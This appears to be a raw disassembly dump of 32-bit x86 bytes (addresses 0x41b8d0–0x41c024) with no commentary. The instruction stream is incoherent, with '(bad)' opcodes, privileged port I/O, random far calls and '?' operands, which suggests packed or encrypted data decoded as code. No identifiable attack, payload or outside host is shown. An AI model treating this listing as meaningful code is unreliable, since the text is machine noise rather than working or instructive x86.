  41b8d0:	outs   dx,DWORD PTR ds:[esi]
  41b8d1:	cmp    BYTE PTR [eax+0x3c],0x96
  41b8d5:	aam    0xf1
  41b8d7:	mov    esp,?
  41b8d9:	push   es
  41b8da:	sbb    al,0x1
  41b8dc:	adc    eax,edi
  41b8de:	push   edx
  41b8df:	pusha  
  41b8e0:	fs cmp al,0xd1
  41b8e3:	or     dl,dl
  41b8e5:	add    ebp,ebp
  41b8e7:	mov    eax,ds:0x149a8576
  41b8ec:	xor    cl,dl
  41b8ee:	mov    dh,0x86
  41b8f0:	mov    edx,0xda7f5812
  41b8f5:	xchg   ecx,eax
  41b8f6:	push   ebp
  41b8f7:	into   
  41b8f8:	aad    0x1f
  41b8fa:	push   esi
  41b8fb:	dec    DWORD PTR [eax-0x398095aa]
  41b901:	and    ecx,ecx
  41b903:	(bad)  
  41b904:	pop    ebx
  41b905:	mov    dh,0x81
  41b907:	mov    edi,cs
  41b909:	mov    eax,0xe302a6e8
  41b90e:	dec    esi
  41b90f:	mov    cl,0x59
  41b911:	rol    BYTE PTR [esp+esi*1+0x498658df],cl
  41b918:	push   ebp
  41b919:	or     eax,0xf9d79de
  41b91e:	pop    edi
  41b91f:	mov    ds:0x7a29e240,al
  41b924:	xor    ah,BYTE PTR [edi-0x122fe1a5]
  41b92a:	push   ss
  41b92b:	mov    esp,0x626cc379
  41b930:	mov    edx,0x8c2ffe00
  41b935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b936:	dec    edi
  41b937:	xchg   ecx,eax
  41b938:	push   ecx
  41b939:	inc    eax
  41b93a:	mov    esp,0xe8db4adc
  41b93f:	(bad)  
  41b941:	pop    es
  41b942:	inc    ecx
  41b943:	xchg   edi,eax
  41b944:	cs cmp esp,ebp
  41b947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b948:	test   BYTE PTR [edx],0x20
  41b94b:	dec    edi
  41b94c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b94d:	mov    esi,0xabe05782
  41b952:	push   ds
  41b953:	and    bh,BYTE PTR [edx-0x353bb283]
  41b959:	lea    ebx,[edi+esi*2+0x22deb877]
  41b960:	sbb    esi,DWORD PTR [edx]
  41b962:	xchg   esp,eax
  41b963:	add    cl,dl
  41b965:	fsub   QWORD PTR [eax+eax*1-0x5f]
  41b969:	nop
  41b96a:	stos   BYTE PTR es:[edi],al
  41b96b:	arpl   WORD PTR [edi],ax
  41b96d:	mov    esp,0xbe9eceec
  41b972:	aas    
  41b973:	cwde   
  41b974:	mov    DWORD PTR [esi-0x47],edx
  41b977:	rcl    BYTE PTR ds:0xa339fdfb,cl
  41b97d:	adc    al,bl
  41b97f:	imul   ebx,DWORD PTR [ebp-0x4d1dd314],0x45
  41b986:	xchg   ebx,eax
  41b987:	jae    0x41b9fc
  41b989:	ds inc eax
  41b98b:	xchg   esi,eax
  41b98c:	and    ebp,DWORD PTR ds:0xc616b87d
  41b992:	sbb    ebx,0xffffffa9
  41b995:	pop    edx
  41b996:	test   al,0x24
  41b998:	adc    ecx,DWORD PTR [esi+ebp*8-0x15e34846]
  41b99f:	mov    ds:0x4c85eb34,eax
  41b9a4:	adc    eax,0x4c30d9b5
  41b9a9:	ja     0x41b94f
  41b9ab:	stc    
  41b9ac:	push   eax
  41b9ad:	cmp    eax,0x4aba1f2a
  41b9b2:	inc    edi
  41b9b3:	arpl   WORD PTR [ecx+0x5ac23bdc],cx
  41b9b9:	cld    
  41b9ba:	push   cs
  41b9bb:	mov    DWORD PTR [eax+0x9],edx
  41b9be:	sti    
  41b9bf:	sbb    dl,cl
  41b9c1:	xchg   edi,eax
  41b9c2:	fwait
  41b9c3:	sub    DWORD PTR [esi-0x44],ecx
  41b9c6:	push   0xfcef7f15
  41b9cb:	bound  ebp,QWORD PTR [ecx-0x4629dfa3]
  41b9d1:	fidiv  WORD PTR [eax+0x7d]
  41b9d4:	clc    
  41b9d5:	lds    ecx,FWORD PTR [ebx]
  41b9d7:	sbb    BYTE PTR [ebx],dh
  41b9d9:	mov    eax,ds:0x2c127090
  41b9de:	ds into 
  41b9e0:	xlat   BYTE PTR ds:[ebx]
  41b9e1:	and    BYTE PTR [ecx+0x11d1402e],ch
  41b9e7:	in     al,0x74
  41b9e9:	aad    0x35
  41b9eb:	hlt    
  41b9ec:	sub    eax,esi
  41b9ee:	lods   eax,DWORD PTR ds:[esi]
  41b9ef:	jnp    0x41ba3e
  41b9f1:	jno    0x41b97f
  41b9f3:	jo     0x41b9b4
  41b9f5:	test   BYTE PTR [ebx+0x1eeaeca1],ah
  41b9fb:	pop    edi
  41b9fc:	nop
  41b9fd:	gs ret 0xe51
  41ba01:	inc    esi
  41ba02:	xchg   edi,eax
  41ba03:	xchg   esi,eax
  41ba04:	push   ds
  41ba05:	dec    DWORD PTR [esi]
  41ba07:	scas   eax,DWORD PTR es:[edi]
  41ba08:	scas   eax,DWORD PTR es:[edi]
  41ba09:	shl    eax,0x20
  41ba0c:	sub    eax,0x7711406d
  41ba11:	popf   
  41ba12:	aam    0xe2
  41ba14:	out    0x61,al
  41ba16:	shld   esp,ecx,cl
  41ba19:	out    dx,eax
  41ba1a:	mov    DWORD PTR [ecx],edi
  41ba1c:	inc    esp
  41ba1d:	dec    esi
  41ba1e:	xchg   BYTE PTR [esi+0xe],al
  41ba21:	adc    al,0x77
  41ba23:	jmp    0x41b9b8
  41ba25:	ret    
  41ba26:	aad    0xe2
  41ba28:	mov    edx,esi
  41ba2a:	xor    ch,0x67
  41ba2d:	jo     0x41ba24
  41ba2f:	xchg   esi,eax
  41ba30:	push   es
  41ba31:	ins    BYTE PTR es:[edi],dx
  41ba32:	pop    ecx
  41ba33:	dec    edi
  41ba34:	arpl   WORD PTR [ebx],ax
  41ba36:	cld    
  41ba37:	pop    DWORD PTR [edx-0x30]
  41ba3a:	mov    ch,0x1c
  41ba3c:	jl     0x41b9ea
  41ba3e:	lods   al,BYTE PTR ds:[esi]
  41ba3f:	repnz (bad) 
  41ba41:	repnz les eax,FWORD PTR [ecx-0x30]
  41ba45:	sbb    esi,DWORD PTR [edx+0x7a]
  41ba48:	push   eax
  41ba49:	pop    es
  41ba4a:	ret    
  41ba4b:	xor    DWORD PTR [ebx],0x730191f4
  41ba51:	pop    eax
  41ba52:	nop
  41ba53:	shl    BYTE PTR [ebp-0x48dc0276],0x96
  41ba5a:	lock ss imul edi,edx,0x2b
  41ba5f:	(bad)  
  41ba61:	pop    es
  41ba62:	mov    bh,0xae
  41ba64:	fwait
  41ba65:	in     al,dx
  41ba66:	fdivp  st(0),st
  41ba68:	xchg   cl,al
  41ba6a:	jne    0x41baba
  41ba6c:	inc    esi
  41ba6d:	pushf  
  41ba6e:	jge    0x41badd
  41ba70:	es dec ebx
  41ba72:	enter  0x1d73,0x35
  41ba76:	dec    ecx
  41ba77:	cwde   
  41ba78:	add    esp,DWORD PTR [ebp+eiz*1-0x11]
  41ba7c:	pop    ebx
  41ba7d:	popa   
  41ba7e:	xchg   esp,eax
  41ba7f:	sbb    DWORD PTR ds:0xb8c39a53,esp
  41ba85:	fs xor al,0x25
  41ba88:	shl    ch,0x14
  41ba8b:	out    0xbf,al
  41ba8d:	jle    0x41ba6a
  41ba8f:	add    eax,0x85dc9544
  41ba94:	mov    ds:0x2c124292,eax
  41ba99:	call   0x4fe6:0x6813b0c9
  41baa0:	xchg   ebx,eax
  41baa1:	mov    bl,0xc3
  41baa3:	lea    ebp,[edx-0x51bf2488]
  41baa9:	push   es
  41baaa:	inc    ebx
  41baab:	mov    ds:0x16e50ef,eax
  41bab0:	adc    ebx,DWORD PTR [edi+0x33]
  41bab3:	pop    eax
  41bab4:	mov    esp,0x65b35314
  41bab9:	mov    eax,ds:0xe2f13ec0
  41babe:	mov    ds:0x2070e225,eax
  41bac3:	cmp    eax,0xa7a5d88e
  41bac8:	test   BYTE PTR [edx+0x2f87497],0xd8
  41bacf:	in     eax,dx
  41bad0:	stos   BYTE PTR es:[edi],al
  41bad1:	mov    edi,0xb09e2482
  41bad6:	mov    ds:0xaa320206,eax
  41badb:	outs   dx,BYTE PTR ds:[esi]
  41badc:	xor    eax,0xde140234
  41bae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bae2:	inc    ebp
  41bae3:	push   ebp
  41bae4:	test   DWORD PTR [esi],edx
  41bae6:	sub    al,0xdb
  41bae8:	outs   dx,DWORD PTR ds:[esi]
  41bae9:	rcr    BYTE PTR [ecx-0xebcdffe],cl
  41baef:	xchg   edi,eax
  41baf0:	scas   al,BYTE PTR es:[edi]
  41baf1:	pop    edx
  41baf2:	mov    bh,0x2b
  41baf4:	mov    cl,ah
  41baf6:	or     esi,ebx
  41baf8:	or     esi,DWORD PTR [eax]
  41bafa:	ja     0x41baf9
  41bafc:	(bad)  
  41bafd:	cmc    
  41bafe:	push   edx
  41baff:	sbb    DWORD PTR [edi-0x7d063682],ecx
  41bb05:	mov    eax,0x12ddc8c8
  41bb0a:	jle    0x41bb0f
  41bb0c:	sub    DWORD PTR [eax+0x6a],esp
  41bb0f:	sbb    bl,al
  41bb11:	xchg   ecx,eax
  41bb12:	lds    ebx,FWORD PTR [edx-0x54]
  41bb15:	(bad)  
  41bb16:	nop
  41bb17:	or     al,0x6d
  41bb19:	sub    BYTE PTR [eax-0x53],cl
  41bb1c:	inc    esp
  41bb1d:	jae    0x41bb00
  41bb1f:	iret   
  41bb20:	stos   BYTE PTR es:[edi],al
  41bb21:	xchg   esi,ebx
  41bb23:	push   eax
  41bb24:	jl     0x41bb7e
  41bb26:	fistp  WORD PTR [edx-0x4]
  41bb29:	sbb    ch,BYTE PTR [eax+0x65]
  41bb2c:	(bad)  
  41bb2d:	hlt    
  41bb2e:	push   eax
  41bb2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb30:	addr16 aam 0x26
  41bb33:	dec    esp
  41bb34:	ss loop 0x41bb3f
  41bb37:	fnstsw WORD PTR [edi]
  41bb39:	mov    esp,0x357e6f3a
  41bb3e:	psllq  mm1,QWORD PTR [ebp+0x52]
  41bb42:	in     eax,dx
  41bb43:	imul   edx,DWORD PTR [ebx-0x3686cb4a],0x7c
  41bb4a:	fmul   QWORD PTR es:[ebx+esi*1]
  41bb4e:	popa   
  41bb4f:	lds    esi,FWORD PTR [ecx]
  41bb51:	pusha  
  41bb52:	das    
  41bb53:	mov    al,ds:0x205dedcf
  41bb58:	fadd   st,st(3)
  41bb5a:	jbe    0x41bb59
  41bb5c:	xlat   BYTE PTR ds:[ebx]
  41bb5d:	ret    0x7821
  41bb60:	xchg   ebp,eax
  41bb61:	dec    ecx
  41bb62:	(bad)
  41bb65:	mov    ebp,0x833d437
  41bb6a:	fidiv  DWORD PTR [edi+0x63]
  41bb6d:	out    dx,eax
  41bb6e:	int    0x83
  41bb70:	shl    DWORD PTR [edi+0x38],0x56
  41bb74:	adc    eax,0x65d346d0
  41bb79:	mov    ebp,0x471a13e3
  41bb7e:	lds    ebp,FWORD PTR ds:0xf62ae1c5
  41bb84:	popa   
  41bb85:	daa    
  41bb86:	popf   
  41bb87:	loope  0x41bc08
  41bb89:	(bad)  
  41bb8a:	fisttp WORD PTR [ebp+0x4353114]
  41bb90:	call   0x5016:0x774a67
  41bb97:	jmp    0x41bb2c
  41bb99:	mov    cl,0x7e
  41bb9b:	mov    ?,ebp
  41bb9d:	and    al,0x22
  41bb9f:	cmp    eax,0x405c2d53
  41bba4:	mov    ebp,0x68f5e481
  41bba9:	ret    0xd98a
  41bbac:	test   BYTE PTR [ebp+edi*8-0x2b],0xb5
  41bbb1:	push   ebp
  41bbb2:	and    dl,dh
  41bbb4:	mov    esi,0x204d7e98
  41bbb9:	mov    bh,0xb7
  41bbbb:	and    ah,bh
  41bbbd:	add    DWORD PTR [esi],ecx
  41bbbf:	bound  edx,QWORD PTR [esi]
  41bbc1:	enter  0xd5f0,0xf7
  41bbc5:	and    eax,0xc0f0f552
  41bbca:	loop   0x41bc35
  41bbcc:	cs mov ebp,0xebd7130b
  41bbd2:	push   ss
  41bbd3:	dec    esi
  41bbd4:	shl    DWORD PTR [ecx+0x9f7ce93],cl
  41bbda:	nop
  41bbdb:	popa   
  41bbdc:	jmp    0x7385:0x27efeb27
  41bbe3:	adc    eax,0xeafc7fb6
  41bbe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbe9:	fiadd  DWORD PTR [eax-0x50bd855]
  41bbef:	mov    dl,0xc8
  41bbf1:	pop    edi
  41bbf2:	or     eax,0x52eedee0
  41bbf7:	out    dx,al
  41bbf8:	imul   ebx,DWORD PTR [eax-0x4c],0xee509629
  41bbff:	loopne 0x41bc2d
  41bc01:	xor    BYTE PTR [edi-0xf1f857],ch
  41bc07:	xor    eax,0x8d5109ef
  41bc0c:	hlt    
  41bc0d:	cdq    
  41bc0e:	inc    ebx
  41bc0f:	pop    ds
  41bc10:	int3   
  41bc11:	mov    BYTE PTR [ebx+0x0],dl
  41bc14:	push   eax
  41bc15:	cmc    
  41bc16:	inc    esi
  41bc17:	sub    bh,BYTE PTR ds:0x14d37dc9
  41bc1d:	and    al,BYTE PTR [edi]
  41bc1f:	sar    edx,cl
  41bc21:	pop    ds
  41bc22:	push   edi
  41bc23:	and    eax,0xf32703b5
  41bc28:	arpl   WORD PTR [esi-0x15],dx
  41bc2b:	jne    0x41bc28
  41bc2d:	dec    ebp
  41bc2e:	scas   eax,DWORD PTR es:[edi]
  41bc2f:	lock dec esp
  41bc31:	int    0xc8
  41bc33:	push   0x26d30d1
  41bc38:	jg     0x41bbfc
  41bc3a:	scas   al,BYTE PTR es:[edi]
  41bc3b:	push   edi
  41bc3c:	ret    
  41bc3d:	add    eax,0xfc7c97bf
  41bc42:	dec    esp
  41bc43:	cmp    esp,DWORD PTR [eax+0x7f]
  41bc46:	pusha  
  41bc47:	imul   BYTE PTR [edi+0x6d71a358]
  41bc4d:	jbe    0x41bc51
  41bc4f:	cld    
  41bc50:	fisubr DWORD PTR [edx-0x3dc170e7]
  41bc56:	jge    0x41bc55
  41bc58:	adc    DWORD PTR [ecx-0x7e6e62d2],ecx
  41bc5e:	pop    eax
  41bc5f:	ss mov ?,ebp
  41bc62:	xchg   esp,eax
  41bc63:	cmp    DWORD PTR [esi-0x4c],ecx
  41bc66:	xor    al,0xdf
  41bc68:	push   ecx
  41bc69:	aaa    
  41bc6a:	vpsubb ymm0,ymm2,YMMWORD PTR [ebx+0x7d]
  41bc6f:	adc    ebx,esp
  41bc71:	mov    dl,0x78
  41bc73:	fcomp  DWORD PTR [ebp-0x346216c7]
  41bc79:	jmp    0x41bc96
  41bc7b:	ret    0x718b
  41bc7e:	push   edx
  41bc7f:	sub    al,0xcf
  41bc81:	rol    BYTE PTR ds:0xc125a306,1
  41bc87:	cmp    esi,DWORD PTR [ecx+eax*2+0x57e6c0d9]
  41bc8e:	imul   ebx,DWORD PTR ds:0xa6adc731,0xd
  41bc95:	popa   
  41bc96:	es addr16 xchg ebp,eax
  41bc99:	hlt    
  41bc9a:	mov    dh,0x83
  41bc9c:	(bad)  
  41bc9d:	mov    bl,0xf3
  41bc9f:	inc    edi
  41bca0:	dec    ebp
  41bca1:	(bad)  
  41bca2:	nop
  41bca3:	outs   dx,BYTE PTR ds:[esi]
  41bca4:	gs mov edi,0x1fd3fe43
  41bcaa:	add    BYTE PTR [eax+0x23534c8b],ch
  41bcb0:	add    eax,0x2a5ac1a
  41bcb5:	lds    esi,FWORD PTR [ebp-0x634ab43]
  41bcbb:	fist   DWORD PTR [edi+0x59]
  41bcbe:	xchg   esi,eax
  41bcbf:	xor    eax,0x137bd6ed
  41bcc4:	cmp    BYTE PTR [esi],0x64
  41bcc7:	push   cs
  41bcc8:	js     0x41bccf
  41bcca:	mov    ds:0xa00de479,al
  41bccf:	add    al,0x50
  41bcd1:	mov    esp,0x5e22a7e6
  41bcd6:	arpl   sp,cx
  41bcd8:	mov    ds:0x8da7ddbd,eax
  41bcdd:	outs   dx,DWORD PTR ds:[esi]
  41bcde:	sbb    DWORD PTR [ecx-0x5ce701ab],eax
  41bce4:	(bad)  
  41bce5:	dec    esi
  41bce6:	inc    ecx
  41bce7:	retf   
  41bce8:	dec    esi
  41bce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcea:	gs and eax,0x1ce6cfc7
  41bcf0:	mul    BYTE PTR [ebx]
  41bcf2:	push   esi
  41bcf3:	xchg   ecx,eax
  41bcf4:	adc    edx,DWORD PTR [ecx+0x66]
  41bcf7:	or     dh,BYTE PTR [eax]
  41bcf9:	pop    edi
  41bcfa:	inc    ebp
  41bcfb:	inc    edx
  41bcfc:	pop    ebx
  41bcfd:	int    0x2f
  41bcff:	idiv   cl
  41bd01:	mov    es,WORD PTR [edi-0x76cacea]
  41bd07:	mov    dl,dl
  41bd09:	sub    BYTE PTR [eax],al
  41bd0b:	(bad)  
  41bd0c:	sbb    DWORD PTR [ebp+ebp*1-0x431165c3],ebp
  41bd13:	or     BYTE PTR [ebx+0x29],cl
  41bd16:	mov    ecx,0x42120b86
  41bd1b:	inc    edx
  41bd1c:	adc    DWORD PTR [edx+0x2e],ecx
  41bd1f:	xor    al,0xad
  41bd21:	inc    ebp
  41bd22:	inc    ebx
  41bd23:	push   cs
  41bd24:	mov    edi,0x275ff2a8
  41bd29:	stc    
  41bd2a:	pop    edx
  41bd2b:	jno    0x41bd8d
  41bd2d:	cli    
  41bd2e:	test   al,0x2
  41bd30:	lods   eax,DWORD PTR ds:[esi]
  41bd31:	fidivr DWORD PTR [edx+0x5ae6db3a]
  41bd37:	xor    al,0xf8
  41bd39:	push   ebx
  41bd3a:	call   0x7469:0xa59708c3
  41bd41:	add    al,0xed
  41bd43:	adc    ebp,DWORD PTR [eax-0x1ee8cf42]
  41bd49:	rcl    BYTE PTR [eax+0x74a7c286],0xe4
  41bd50:	popa   
  41bd51:	mov    bh,0x26
  41bd53:	loop   0x41bd95
  41bd55:	stc    
  41bd56:	mov    edi,0x3c45e8e4
  41bd5b:	sub    bl,al
  41bd5d:	in     eax,dx
  41bd5e:	mov    esp,DWORD PTR [edx]
  41bd60:	push   0x54385bd
  41bd65:	out    0xbb,al
  41bd67:	lds    edx,FWORD PTR [ecx-0x1f01b91d]
  41bd6d:	xor    esp,esi
  41bd6f:	pusha  
  41bd70:	mov    bh,0x38
  41bd72:	les    ecx,FWORD PTR [edi+0x5136dc6e]
  41bd78:	sub    al,0x1e
  41bd7a:	lahf   
  41bd7b:	xchg   BYTE PTR [eax],bl
  41bd7d:	clc    
  41bd7e:	cmc    
  41bd7f:	adc    ch,cl
  41bd81:	ins    BYTE PTR es:[edi],dx
  41bd82:	aam    0x7a
  41bd84:	xchg   edi,eax
  41bd85:	xchg   edi,eax
  41bd86:	jg     0x41bd4c
  41bd88:	inc    esp
  41bd89:	jecxz  0x41bdd8
  41bd8b:	mov    dl,0xc3
  41bd8d:	pop    ss
  41bd8e:	dec    ecx
  41bd8f:	in     eax,dx
  41bd90:	mov    edi,0xdde982c5
  41bd95:	or     edx,esp
  41bd97:	inc    ebx
  41bd98:	aam    0x95
  41bd9a:	or     al,0x18
  41bd9c:	pusha  
  41bd9d:	push   edx
  41bd9e:	test   eax,0xa4978c7a
  41bda3:	mov    al,al
  41bda5:	xchg   DWORD PTR [ecx],eax
  41bda7:	jae    0x41bdfa
  41bda9:	imul   ebp,DWORD PTR [edx+0x2c],0xfffffff8
  41bdad:	adc    ch,dl
  41bdaf:	ins    DWORD PTR es:[edi],dx
  41bdb0:	sbb    esi,DWORD PTR [edx+edx*2-0xc]
  41bdb4:	mov    DWORD PTR [esi],esi
  41bdb6:	lods   eax,DWORD PTR ds:[esi]
  41bdb7:	jnp    0x41bdd4
  41bdb9:	sbb    edi,ebx
  41bdbb:	lods   al,BYTE PTR ds:[esi]
  41bdbc:	ja     0x41bdca
  41bdbe:	shr    DWORD PTR [ecx-0x57],1
  41bdc1:	outs   dx,BYTE PTR ds:[esi]
  41bdc2:	ret    0xbd00
  41bdc5:	or     dh,BYTE PTR [ebp+0x28ffea93]
  41bdcb:	sar    BYTE PTR [edx+0x1f],1
  41bdce:	das    
  41bdcf:	retf   
  41bdd0:	jg     0x41bd8a
  41bdd2:	shr    DWORD PTR [ebp+0x7],0x33
  41bdd6:	xlat   BYTE PTR ds:[ebx]
  41bdd7:	data16 fld DWORD PTR [edi+0x3b]
  41bddb:	cmc    
  41bddc:	int3   
  41bddd:	sbb    al,0xf4
  41bddf:	add    BYTE PTR [ebx+0x1f02b2e2],bh
  41bde5:	mov    bl,0x5d
  41bde7:	push   ebp
  41bde8:	pop    edi
  41bde9:	cmp    DWORD PTR [ebx+0x55],0xffffffb7
  41bded:	sub    al,0x83
  41bdef:	(bad)  
  41bdf0:	loop   0x41be13
  41bdf2:	mov    dh,0xb
  41bdf4:	mov    eax,ds:0x9d2434eb
  41bdf9:	inc    eax
  41bdfa:	fisttp QWORD PTR [edi]
  41bdfc:	mov    ch,BYTE PTR [eax+0x21]
  41bdff:	test   BYTE PTR ds:0x969c59f5,ah
  41be05:	mov    edi,0x2104e8e8
  41be0a:	pop    ecx
  41be0b:	aad    0xb9
  41be0d:	sbb    al,0xe5
  41be0f:	cmp    al,cl
  41be11:	push   esp
  41be12:	dec    ecx
  41be13:	add    al,0xc
  41be15:	dec    eax
  41be16:	mov    DWORD PTR [eax+0x224b9d5b],ebp
  41be1c:	jle    0x41bdb0
  41be1e:	ror    BYTE PTR [eax+esi*8],1
  41be21:	mov    ds:0x6fe5c478,eax
  41be26:	(bad)
  41be29:	fld    QWORD PTR [eax]
  41be2b:	loopne 0x41be46
  41be2d:	inc    ecx
  41be2e:	push   ecx
  41be2f:	scas   al,BYTE PTR es:[edi]
  41be30:	fisubr WORD PTR [eax+0x7ec2ba13]
  41be36:	retf   
  41be37:	das    
  41be38:	fld    DWORD PTR [edx+0x6303c2ae]
  41be3e:	pop    eax
  41be3f:	push   es
  41be40:	cmovge edx,esi
  41be43:	jl     0x41be1d
  41be45:	loop   0x41be87
  41be47:	jl     0x41be79
  41be49:	sub    BYTE PTR [edx-0x17],0x91
  41be4d:	ins    DWORD PTR es:[edi],dx
  41be4e:	and    eax,0xddb5c875
  41be53:	xor    al,0x72
  41be55:	xchg   ebp,eax
  41be56:	xor    eax,0xf5fece6e
  41be5b:	lods   eax,DWORD PTR ds:[esi]
  41be5c:	lds    esi,FWORD PTR [ebx+0x7b]
  41be5f:	jae    0x41bed3
  41be61:	ja     0x41becd
  41be63:	and    ecx,ebp
  41be65:	xlat   BYTE PTR ds:[ebx]
  41be66:	xchg   ebp,eax
  41be67:	fdivr  st(2),st
  41be69:	les    esi,FWORD PTR [edx+0x50]
  41be6c:	add    al,0x5d
  41be6e:	add    BYTE PTR [ebx-0x6],0x5e
  41be72:	test   DWORD PTR [ebx-0x7423d04b],ebp
  41be78:	in     al,0x6b
  41be7a:	pop    ecx
  41be7b:	sub    DWORD PTR [edx+0x52],eax
  41be7e:	push   ss
  41be7f:	mov    bh,cl
  41be81:	bound  eax,QWORD PTR [edx]
  41be83:	mov    edx,0xe40371d9
  41be88:	test   DWORD PTR [ebp-0x1c],esi
  41be8b:	inc    ecx
  41be8c:	loop   0x41be66
  41be8e:	push   es
  41be8f:	mov    eax,ds:0xcd6f41c3
  41be94:	mov    ds:0x29ed040c,al
  41be99:	add    al,0x59
  41be9b:	pushf  
  41be9c:	mov    ch,0xdd
  41be9e:	icebp  
  41be9f:	pop    edi
  41bea0:	or     BYTE PTR [edx+0x14],ch
  41bea3:	std    
  41bea4:	xchg   esi,eax
  41bea5:	neg    BYTE PTR [edx+edx*8+0xf]
  41bea9:	fstp   st(4)
  41beab:	or     eax,0x1a8d0b98
  41beb0:	and    ecx,0x2bd0f33e
  41beb6:	cmp    DWORD PTR [ebx-0x4fdefccc],0xaa08359b
  41bec0:	lock dec ebx
  41bec2:	nop
  41bec3:	pop    ss
  41bec4:	sbb    DWORD PTR [ebp-0x13],esi
  41bec7:	retf   0xb540
  41beca:	pop    esi
  41becb:	lds    eax,FWORD PTR [ebx+ecx*2+0x43]
  41becf:	and    eax,0x96fc6af0
  41bed4:	mov    edx,0xf144cb39
  41bed9:	sub    DWORD PTR [eax],edi
  41bedb:	test   DWORD PTR ds:0x278b6210,eax
  41bee1:	pushf  
  41bee2:	pop    ebp
  41bee3:	shl    BYTE PTR [ebp+eax*4+0x46],1
  41bee7:	mov    edi,gs
  41bee9:	dec    edi
  41beea:	cli    
  41beeb:	lods   eax,DWORD PTR ds:[esi]
  41beec:	scas   al,BYTE PTR es:[edi]
  41beed:	test   eax,0x5f8bd5e7
  41bef2:	xchg   esi,eax
  41bef3:	and    BYTE PTR [edi+0x11],ch
  41bef6:	popf   
  41bef7:	jns    0x41bf3f
  41bef9:	xor    ah,dl
  41befb:	xlat   BYTE PTR ds:[ebx]
  41befc:	shl    BYTE PTR [ecx+0x22],0xd3
  41bf00:	popf   
  41bf01:	mov    WORD PTR [eax+0x68],gs
  41bf04:	ja     0x41bf54
  41bf06:	dec    edx
  41bf07:	mov    ebp,0x770a9e34
  41bf0c:	add    eax,0x214e3c2d
  41bf11:	enter  0xb17d,0x6f
  41bf15:	or     eax,0x20daf1e5
  41bf1a:	sbb    al,0xa2
  41bf1c:	mov    WORD PTR [eax-0x4beab0de],es
  41bf22:	mov    eax,ds:0xdaa855cc
  41bf27:	in     eax,0x63
  41bf29:	in     al,0x4b
  41bf2b:	test   al,0xfc
  41bf2d:	aad    0x31
  41bf2f:	or     ah,BYTE PTR [edi]
  41bf31:	mov    ds:0x4eff7440,eax
  41bf36:	inc    ebx
  41bf37:	pop    esp
  41bf38:	pop    ecx
  41bf39:	js     0x41bef7
  41bf3b:	lahf   
  41bf3c:	mov    ebp,0x10a6a856
  41bf41:	push   edx
  41bf42:	xchg   ecx,eax
  41bf43:	mov    ah,0x8a
  41bf45:	retf   0xf26b
  41bf48:	push   edi
  41bf49:	rol    BYTE PTR [eax],0x41
  41bf4c:	mov    ds:0x8f60ec1,al
  41bf51:	loopne 0x41bfb4
  41bf53:	mov    bl,0xec
  41bf55:	xor    BYTE PTR [edi],dh
  41bf57:	and    al,0x51
  41bf59:	pushf  
  41bf5a:	adc    ebx,0x34
  41bf5d:	aad    0xd7
  41bf5f:	ja     0x41bfaa
  41bf61:	cdq    
  41bf62:	in     eax,0xb7
  41bf64:	add    DWORD PTR [ecx-0x3a],eax
  41bf67:	push   ss
  41bf68:	jbe    0x41bfe0
  41bf6a:	loope  0x41bf29
  41bf6c:	dec    ebx
  41bf6d:	fcmovbe st,st(5)
  41bf6f:	hlt    
  41bf70:	xlat   BYTE PTR ds:[ebx]
  41bf71:	fidiv  DWORD PTR [eax+ecx*1-0x61]
  41bf75:	ror    bl,cl
  41bf77:	mov    al,ds:0x73d52e4f
  41bf7c:	clc    
  41bf7d:	and    al,BYTE PTR [ebx-0x7d]
  41bf80:	pop    ss
  41bf81:	stos   BYTE PTR es:[edi],al
  41bf82:	inc    edi
  41bf83:	aas    
  41bf84:	int3   
  41bf85:	outs   dx,DWORD PTR ds:[esi]
  41bf86:	pop    ebx
  41bf87:	dec    esi
  41bf88:	sub    al,BYTE PTR [esi+edi*1]
  41bf8b:	add    bh,BYTE PTR [ebp+0x7e]
  41bf8e:	and    DWORD PTR [esi+0x70],ecx
  41bf91:	repz hlt 
  41bf93:	push   es
  41bf94:	das    
  41bf95:	retf   0x7ff8
  41bf98:	xor    DWORD PTR [edx-0x7e],edx
  41bf9b:	xor    BYTE PTR [edi+0x70],dh
  41bf9e:	pop    bx
  41bfa0:	rcl    DWORD PTR [ecx+eiz*1-0x4546e97e],cl
  41bfa7:	pop    esp
  41bfa8:	popa   
  41bfa9:	pop    esp
  41bfaa:	and    edx,0x2f540a23
  41bfb0:	jmp    0x37f9af8a
  41bfb5:	or     esp,DWORD PTR [edx-0x6d]
  41bfb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfb9:	cs xor ecx,esp
  41bfbc:	imul   ecx,DWORD PTR [esi],0x3a7d5c54
  41bfc2:	int3   
  41bfc3:	push   ecx
  41bfc4:	dec    edx
  41bfc5:	jb     0x41c026
  41bfc7:	and    DWORD PTR [edi-0x1ba1838a],edi
  41bfcd:	cmp    esp,DWORD PTR [ebp-0x3b]
  41bfd0:	stos   DWORD PTR es:[edi],eax
  41bfd1:	pop    esi
  41bfd2:	std    
  41bfd3:	das    
  41bfd4:	mov    dl,0x97
  41bfd6:	leave  
  41bfd7:	fiadd  WORD PTR [ecx]
  41bfd9:	mov    ebx,DWORD PTR [esi-0x34b91b9f]
  41bfdf:	stc    
  41bfe0:	xchg   DWORD PTR [eax],esi
  41bfe2:	jle    0x41bfc1
  41bfe4:	(bad)  
  41bfe5:	mov    ds:0xbf54fcc6,eax
  41bfea:	mov    eax,esp
  41bfec:	and    eax,0x76842779
  41bff1:	and    DWORD PTR [esi-0x78785ad8],esp
  41bff7:	shl    BYTE PTR [esi],cl
  41bff9:	and    al,0xdb
  41bffb:	into   
  41bffc:	xor    ch,BYTE PTR [edi+0x14040f46]
  41c002:	push   eax
  41c003:	mov    ecx,0xc076f047
  41c008:	sub    ah,BYTE PTR [ebp+0x3e]
  41c00b:	inc    edx
  41c00c:	into   
  41c00d:	inc    esi
  41c00e:	(bad)  
  41c00f:	(bad)  
  41c011:	inc    ebx
  41c012:	stos   BYTE PTR es:[edi],al
  41c013:	pusha  
  41c014:	mov    al,ds:0x48182e87
  41c019:	aam    0xe7
  41c01b:	and    esi,DWORD PTR [edx-0x75]
  41c01e:	adc    dh,BYTE PTR [ebp+0x37ec5ffa]
  41c024:	lock int 0x40
